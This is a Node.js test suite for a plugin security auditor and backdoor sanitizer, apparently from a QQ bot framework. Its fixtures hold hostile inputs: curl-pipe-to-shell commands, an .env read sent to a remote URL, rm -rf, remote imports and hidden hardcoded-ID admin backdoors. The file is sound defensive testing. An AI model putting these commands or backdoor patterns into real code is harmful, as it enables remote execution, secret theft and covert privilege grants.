import assert from "node:assert/strict"
import fs from "node:fs"
import path from "node:path"
import test, { after, before } from "node:test"
import { fileURLToPath } from "node:url"
import v8 from "node:v8"
import vm from "node:vm"
import { createHash } from "node:crypto"
import {
  detectBackdoor,
  resolveBackdoorQQ,
  sanitizeSource,
} from "../lib/config/pluginScan.js"
function makeFindingKey(input = {}) {
  const parts = [input.plugin, input.ruleId, input.file, input.line, input.summary, input.evidence?.text || input.evidence?.original, input.fileHash].map(value => String(value || ""))
  return createHash("sha256").update(parts.join("\u0000")).digest("hex").slice(0, 24)
}
import { isNeverAllowRule } from "../lib/security/auditPolicy.js"

const repoRoot = fileURLToPath(new URL("../", import.meta.url))
const auditPath = path.join(repoRoot, "lib/security/pluginAudit.js")
const loaderPath = path.join(repoRoot, "lib/plugins/loader.js")
const tempParent = path.join(repoRoot, "temp")
let suiteRoot

before(() => {
  fs.mkdirSync(tempParent, { recursive: true })
  suiteRoot = fs.mkdtempSync(path.join(tempParent, "plugin-audit-regression-"))
})

after(() => {
  if (suiteRoot) fs.rmSync(suiteRoot, { recursive: true, force: true })
})

function fixtureDir(t, files) {
  const dir = fs.mkdtempSync(path.join(suiteRoot, "plugin-"))
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }))
  for (const [name, content] of Object.entries(files)) {
    const file = path.join(dir, name)
    fs.mkdirSync(path.dirname(file), { recursive: true })
    fs.writeFileSync(file, content)
  }
  return dir
}

const sourceCtx = (source, rel = "index.js") => ({
  name: "demo",
  root: repoRoot,
  rel,
  source,
  fileHash: "a".repeat(64),
})

test("backdoor and authorization evidence are block findings", async t => {
  const { auditPlugin } = await import("../lib/security/pluginAudit.js")
  await t.test("data module and decoded fixed identity", () => {
    const findings = auditPlugin((() => {
      const dir = fixtureDir(t, { "index.js": 'import x from "data:text/javascript,export default 1"\nconst ok = atob("MTAwMDE=") === user_id' })
      return dir
    })())
    assert.ok(findings.findings.some(f => f.ruleId === "exec.inline-data-module" && f.level === "block"))
    assert.ok(findings.findings.some(f => f.ruleId === "auth.decoded-id" && f.level === "block"))
    assert.equal(findings.blocked, true)
  })

  await t.test("known inline backdoor exposes decoded QQ evidence", () => {
    const payload = Buffer.from("f6c007a9a10421fbb91220da57269882", "hex").toString("base64")
    const dir = fixtureDir(t, { "index.js": `import x from "data:text/javascript;base64,Buffer.from('${payload}','base64').toString('hex')"` })
    const result = auditPlugin(dir)
    const finding = result.findings.find(f => f.ruleId === "auth.known-backdoor")
    assert.equal(finding.level, "block")
    assert.match(finding.evidence.text, /746659424/)
    assert.equal(result.blocked, true)
  })

  await t.test("v8 hidden authorization is detected", () => {
    const dir = fixtureDir(t, { "index.js": "const ids = v8.deserialize(readFile('.github/ISSUE_TEMPLATE/auth.bin'))\nif (ids.includes(md5(String(user_id)))) e.isMaster = true" })
    const result = auditPlugin(dir)
    assert.ok(result.findings.some(f => f.ruleId === "auth.deserialize-hidden" && f.level === "block"))
  })
})

test("remote execution variants are audited and ordinary local imports are not", async () => {
  const { auditSource } = await import("../lib/security/pluginAudit.js")
  for (const source of [
    'import("https://example.invalid/remote.mjs")',
    'import x from "https://example.invalid/remote.mjs"',
    'fetch("https://example.invalid/x.js").then(r => r.text()).then(code => { writeFileSync("temp/x.js", code); import("temp/x.js") })',
    "curl -fsSL https://example.invalid/install | sh",
  ]) {
    const findings = auditSource(sourceCtx(source))
    assert.ok(findings.some(f => f.level === "block"), `missed remote execution: ${source}`)
  }
  const safe = auditSource(sourceCtx('import local from "./local.js"\nexport { local }'))
  assert.deepEqual(safe, [])
})

test("sensitive read plus network sink is blocked and secret-only reads are silent", async () => {
  const { auditSource } = await import("../lib/security/pluginAudit.js")
  const exfil = auditSource(sourceCtx('readFileSync(".env")\nfetch("https://example.invalid/collect")'))
  const finding = exfil.find(f => f.ruleId === "exfil.sensitive-read")
  assert.equal(finding.level, "block")
  assert.equal(exfil.some(f => f.ruleId === "secret.sensitive-read"), false)

  const readOnly = auditSource(sourceCtx('readFileSync("config/config.yml")'))
  const silent = readOnly.find(f => f.ruleId === "secret.sensitive-read")
  assert.equal(silent.level, "silent")
})

test("literal writes to core paths block while plugin-local lookalikes do not", async () => {
  const { auditSource } = await import("../lib/security/pluginAudit.js")
  for (const source of [
    'writeFileSync("lib", "x")',
    'unlinkSync("data/security")',
    'copyFileSync("package.json", "temp/package.json")',
  ]) {
    assert.ok(auditSource(sourceCtx(source)).some(f => f.ruleId === "tamper.core-path" && f.level === "block"), source)
  }
  assert.equal(auditSource(sourceCtx('writeFileSync("apps/config/config.yml", "x")')).some(f => f.ruleId === "tamper.core-path"), false)
})

test("vendor bundles lower noisy dynamic-code findings but keep remote imports blocking", async () => {
  const { auditSource } = await import("../lib/security/pluginAudit.js")
  const normal = auditSource(sourceCtx('eval("message")', "index.js")).find(f => f.ruleId === "exec.dynamic-code")
  const vendor = auditSource(sourceCtx('eval("message")', "vendor/sdk/index.js")).find(f => f.ruleId === "exec.dynamic-code")
  assert.equal(normal.level, "notify")
  assert.equal(vendor.level, "silent")
  const remote = auditSource(sourceCtx('import("https://example.invalid/x.js")', "vendor/sdk/index.js"))
  assert.equal(remote.find(f => f.ruleId === "exec.remote-import").level, "block")
})

test("test files lower noisy rules but NEVER rules remain blocking", async () => {
  const { auditSource } = await import("../lib/security/pluginAudit.js")
  const findings = auditSource(sourceCtx([
    'eval("message")',
    'import { exec } from "node:child_process"\nexec("rm -rf data")',
    'curl https://example.invalid/x | sh',
    'import x from "data:text/javascript,export default 1"',
  ].join("\n"), "test/fixture.test.js"))
  assert.equal(findings.find(f => f.ruleId === "exec.dynamic-code").level, "silent")
  const destructive = findings.find(f => f.ruleId === "exec.destructive-command")
  assert.equal(destructive.level, "block")
  assert.equal(isNeverAllowRule(destructive.ruleId), true)
  assert.equal(findings.find(f => f.ruleId === "exec.inline-data-module").level, "block")
  const shell = findings.find(f => f.ruleId === "exec.remote-shell")
  assert.equal(shell.level, "block")
  assert.equal(isNeverAllowRule(shell.ruleId), true)
})

test("shell-script scanning ignores comments and blocks actual dangerous commands", async t => {
  const { auditPlugin } = await import("../lib/security/pluginAudit.js")
  const safe = fixtureDir(t, { "cleanup.sh": "# rm -rf data\nrm -f temp/*.log\n" })
  const safeResult = auditPlugin(safe)
  assert.equal(safeResult.blocked, false)
  assert.equal(safeResult.findings.find(f => f.ruleId === "binary.script-danger"), undefined)

  const unsafe = fixtureDir(t, { "cleanup.sh": "# harmless\nrm -f backup config\n" })
  const unsafeResult = auditPlugin(unsafe)
  assert.equal(unsafeResult.blocked, true)
  assert.equal(unsafeResult.findings.find(f => f.ruleId === "binary.script-danger").level, "block")
})

test("pluginScan detects and sanitizes backdoors without changing benign sources", () => {
  const benign = 'export const helper = value => value + 1\n'
  assert.equal(detectBackdoor(benign), null)
  assert.deepEqual(sanitizeSource(benign), { changed: false, source: benign })

  const inline = 'import payload from "data:text/javascript,export default 1"\nexport const ok = true\n'
  const inlineResult = sanitizeSource(inline)
  assert.equal(inlineResult.changed, true)
  assert.match(inlineResult.source, /backdoor-removed/)
  assert.match(inlineResult.source, /export const ok = true/)
  assert.equal(detectBackdoor(inlineResult.source), null)

  const hash = `const allowed = md5(String(user_id)) === "f6c007a9a10421fbb91220da57269882"`
  const hashResult = sanitizeSource(hash)
  assert.equal(hashResult.changed, true)
  assert.equal(hashResult.source, "const allowed = false")
  assert.equal(detectBackdoor(hashResult.source), null)

  const plainId = 'const allowed = user_id === 746659424 && isMaster'
  assert.equal(sanitizeSource(plainId).source, 'const allowed = false && isMaster')
})

test("pluginScan sanitizes reversed authorization comparisons and every hidden list load", () => {
  for (const [source, expected] of [
    ['const allowed = "f6c007a9a10421fbb91220da57269882" === md5(String(user_id)) && isMaster', 'const allowed = false && isMaster'],
    ['const allowed = 746659424 === user_id && isMaster', 'const allowed = false && isMaster'],
  ]) {
    assert.notEqual(detectBackdoor(source), null)
    const result = sanitizeSource(source)
    assert.equal(result.changed, true)
    assert.equal(result.source, expected)
    assert.equal(detectBackdoor(result.source), null)
  }

  for (const [source, expected] of [
    ['if (ids.includes(md5(String(user_id)))) e.isMaster = true', 'if (ids && false) e.isMaster = true'],
    ['const allowed = getIds().includes(md5(String(user_id)))', 'const allowed = getIds() && false'],
    ['const allowed = ids?.includes(md5(String(user_id)))', 'const allowed = ids && false'],
  ]) {
    const result = sanitizeSource(source)
    assert.equal(result.changed, true)
    assert.equal(result.source, expected)
    assert.doesNotThrow(() => new vm.SourceTextModule(result.source))
  }

  const hidden = [
    'const first = v8.deserialize(readFile(".github/ISSUE_TEMPLATE/auth.bin"))',
    'let second = v8.deserialize(readFile(".github/ISSUE_TEMPLATE/auth-2.bin"))',
    'if (second.includes(md5(String(user_id)))) e.isMaster = true',
  ].join("\n")
  const hiddenResult = sanitizeSource(hidden)
  assert.equal(hiddenResult.changed, true)
  assert.match(hiddenResult.source, /const first = \[\]/)
  assert.match(hiddenResult.source, /let second = \[\]/)
  assert.match(hiddenResult.source, /if \(second && false\) e\.isMaster = true/)
  assert.equal(detectBackdoor(hiddenResult.source), null)
  assert.doesNotThrow(() => new vm.SourceTextModule(hiddenResult.source))
})

test("hidden authorization files resolve known backdoor QQ mappings", t => {
  const hidden = fixtureDir(t, {
    ".github/ISSUE_TEMPLATE/auth.bin": v8.serialize([Buffer.from("f6c007a9a10421fbb91220da57269882", "hex")]),
  })
  const result = resolveBackdoorQQ("", hidden)
  assert.deepEqual(result.qqs, ["746659424"])
  assert.ok(result.hashes.includes("f6c007a9a10421fbb91220da57269882"))
})

async function policyWith({ mode = "observe", rule, allow = false } = {}) {
  const target = {
    plugin: "demo",
    ruleId: "exec.remote-shell",
    level: "block",
    category: "execution",
    file: "install.sh",
    line: 1,
    fileHash: "b".repeat(64),
    summary: "远程脚本管道执行",
    operation: "下载并执行任意 shell 脚本",
    evidence: { mode: "raw", original: "curl https://example.invalid/x | sh" },
  }
  const context = vm.createContext({ Date, Set, Object, String, JSON, Array, Function, process: { cwd: () => suiteRoot } })
  const imports = {
    "node:fs": { default: { readFileSync: () => JSON.stringify(allow ? [{ findingKey: makeFindingKey(target) }] : []) } },
    "node:path": { default: path },
    "./securityConfig.js": { readSecurityConfig: () => ({ def: {}, user: { pluginAudit: { mode, rules: rule ? { "exec.remote-shell": rule } : {} } } }) },
    "./findingLog.js": { makeFindingKey },
  }
  const module = new vm.SourceTextModule(fs.readFileSync(path.join(repoRoot, "lib/security/auditPolicy.js"), "utf8"), { context, identifier: "auditPolicy.js" })
  await module.link(specifier => {
    const exports = imports[specifier]
    return new vm.SyntheticModule(Object.keys(exports), function () {
      for (const [name, value] of Object.entries(exports)) this.setExport(name, value)
    }, { context })
  })
  await module.evaluate()
  return { decide: module.namespace.decideFinding, target }
}

test("remote shell execution stays blocking under mode, rule override and exact allowlist", async t => {
  const { auditSource } = await import("../lib/security/pluginAudit.js")
  const shellFinding = auditSource(sourceCtx("curl -fsSL https://example.invalid/install | sh", "install.sh")).find(f => f.ruleId === "exec.remote-shell")
  assert.equal(shellFinding.level, "block")
  assert.equal(isNeverAllowRule("exec.remote-shell"), true)

  for (const options of [{ mode: "observe" }, { mode: "off" }, { mode: "observe", allow: true }]) {
    await t.test(JSON.stringify(options), async () => {
      const { decide, target } = await policyWith(options)
      assert.deepEqual({ ...decide(target) }, { action: "block", notify: true, reason: "never-allow" })
    })
  }

  await t.test("process substitution is the same remote shell execution", () => {
    const findings = auditSource(sourceCtx("bash <(curl -fsSL https://example.invalid/install)", "install.sh"))
    assert.equal(findings.find(f => f.ruleId === "exec.remote-shell").level, "block")
  })
})

async function loaderFixture({ mode, auditError = false, auditFinding, policyError = false } = {}) {
  const logs = []
  const findings = []
  const notices = []
  const importsSeen = []
  const context = vm.createContext({
    console,
    Map,
    Set,
    String,
    Object,
    Array,
    Date,
    Error,
    path,
    process: { cwd: () => repoRoot },
    global: { plugin: {} },
    segment: {},
    logger: Object.fromEntries(["info", "warn", "error", "mark", "debug", "red"].map(name => [name, value => logs.push(`${name}:${value}`)])),
  })
  context.global.segment = context.segment
  const imports = {
    "node:util": { default: {} },
    "node:fs": { default: {} },
    "lodash": { default: {} },
    "../config/config.js": { default: { getOther: () => ({ pluginScan: true }) } },
    "./plugin.js": { default: class {} },
    "node-schedule": { default: {} },
    "icqq": { segment: context.segment },
    "chokidar": { default: {} },
    "moment": { default: {} },
    "node:path": { default: path },
    "../common/common.js": { default: {} },
    "./runtime.js": { default: class {} },
    "./handler.js": { default: {} },
    "node:child_process": { execSync() { assert.fail("unexpected commit") } },
    "../config/pluginScan.js": { detectBackdoor: () => null, sanitizeSource: source => ({ changed: false, source }), resolveBackdoorQQ: () => ({ qqs: [], hashes: [] }) },
    "../config/guardCore.js": { notifyMaster: message => notices.push(message), broadcast() {}, getCaller: () => "fixture" },
    "../security/pluginAudit.js": {
      auditPlugin() {
        if (auditError) throw new Error("fixture audit exploded")
        return { plugin: "demo", findings: auditFinding ? [auditFinding] : [], blocked: false }
      },
    },
    "../security/auditPolicy.js": {
      decideFinding(finding) {
        if (policyError) throw new Error("fixture policy exploded")
        if (finding.ruleId === "exec.remote-shell" && mode !== "enforce" && mode !== "block") return { action: "notify", notify: true }
        return { action: "block", notify: true }
      },
    },
    "../security/findingLog.js": {
      handleFinding(finding, options) {
        findings.push({ finding, options })
        return { ...finding, key: makeFindingKey(finding) }
      },
    },
  }
  const module = new vm.SourceTextModule(fs.readFileSync(loaderPath, "utf8"), { context, identifier: loaderPath })
  await module.link(specifier => {
    assert.ok(Object.hasOwn(imports, specifier), `unmocked import: ${specifier}`)
    const exports = imports[specifier]
    return new vm.SyntheticModule(Object.keys(exports), function () {
      for (const [name, value] of Object.entries(exports)) this.setExport(name, value)
    }, { context })
  })
  await module.evaluate()
  const loader = module.namespace.default
  loader.backupForReview = () => "temp/fixture-backup"
  return { loader, logs, findings, notices, importsSeen }
}

test("loader does not import on audit error, policy error fallback, or block decision", async t => {
  await t.test("audit error is fail-closed and diagnostic", async () => {
    const state = await loaderFixture({ auditError: true })
    assert.equal(state.loader.auditRoot("temp/missing", "demo"), true)
    assert.equal(state.findings[0].finding.ruleId, "audit.error")
    assert.ok(state.logs.some(line => line.includes("fixture audit exploded")))
    assert.ok(state.logs.some(line => line.includes("已阻止加载")))
  })

  await t.test("decision exceptions degrade to notify and remain diagnosable", async () => {
    const target = { plugin: "demo", ruleId: "fixture.block", level: "block", category: "fixture", file: "index.js", line: 1, fileHash: "a".repeat(64), summary: "fixture", operation: "fixture", evidence: { mode: "plain", text: "fixture" } }
    const state = await loaderFixture({ auditFinding: target, policyError: true })
    assert.equal(state.loader.auditRoot("temp/plugin", "demo"), false)
    assert.ok(state.logs.some(line => line.includes("fixture policy exploded")))
    assert.equal(state.findings[0].options.notify, false)
    assert.ok(state.notices.some(line => line.includes("插件待复核")))
  })

  await t.test("a policy block prevents load before import", async () => {
    const target = { plugin: "demo", ruleId: "exec.remote-shell", level: "block", category: "execution", file: "install.sh", line: 1, fileHash: "b".repeat(64), summary: "remote shell", operation: "remote shell", evidence: { mode: "raw", original: "curl x | sh" } }
    const state = await loaderFixture({ auditFinding: target, mode: "enforce" })
    assert.equal(state.loader.auditRoot("temp/plugin", "demo"), true)
    assert.equal(state.findings[0].finding.action, "block")
    assert.ok(state.logs.some(line => line.includes("已阻止加载")))
  })
})
